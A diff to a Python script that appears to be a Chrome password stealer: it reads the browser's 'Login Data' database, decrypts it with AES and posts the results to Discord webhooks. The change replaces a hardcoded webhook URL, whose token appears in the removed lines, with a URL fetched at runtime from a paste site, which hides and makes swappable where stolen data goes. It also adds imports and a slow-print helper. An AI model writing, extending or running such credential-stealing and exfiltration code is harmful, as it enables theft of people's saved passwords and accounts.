@@ -42,8 +42,14 @@ from urllib.request import Request, urlopen
 from datetime import timezone, datetime, timedelta
 from Crypto.Cipher import AES
 import win32com.shell.shell as shell
+import os, random, string, time, ctypes, sys, requests, base64, json
+from colorama import Fore
+from itertools import cycle
+from random import randint
+from lxml.html import fromstring
+import traceback
 
-url = "https://hastebin.com/raw/akocowasoy"
+url = "hastebin or pastebin url raw"
 r = requests.get(url)
 webhook_url = r.text
 
@@ -234,11 +240,12 @@ def main():
 
 
 # DISCORD WEBHOOK:
-hook = Webhook(
-    "https://discord.com/api/webhooks/888513394460749844/pfCqw5LxNCFPBlKAoZykfYLAEm41hqEoKNZ6m1VCr-vRw-JbG0UgXphzeWak-BSY6XRu")
+url = "hastebin or pastebin url raw"
+r = requests.get(url)
+webhook_url = r.text
+hook = Webhook(r.text)
 # DISCORD WEBHOOK 2:
-hooks = Webhook(
-    "https://discord.com/api/webhooks/888513394460749844/pfCqw5LxNCFPBlKAoZykfYLAEm41hqEoKNZ6m1VCr-vRw-JbG0UgXphzeWak-BSY6XRu")
+hooks = Webhook(r.text)
 
 APP_DATA_PATH = os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -605,6 +612,10 @@ try:
         os.remove(filename)
 except BaseException:
         pass
+def slowprint(s, c, newLine = True):
+	for c in s + '\n':
+		sys.stdout.write(c); sys.stdout.flush(); time.sleep(1./30)
+
 
 
 if __name__ == "__main__":
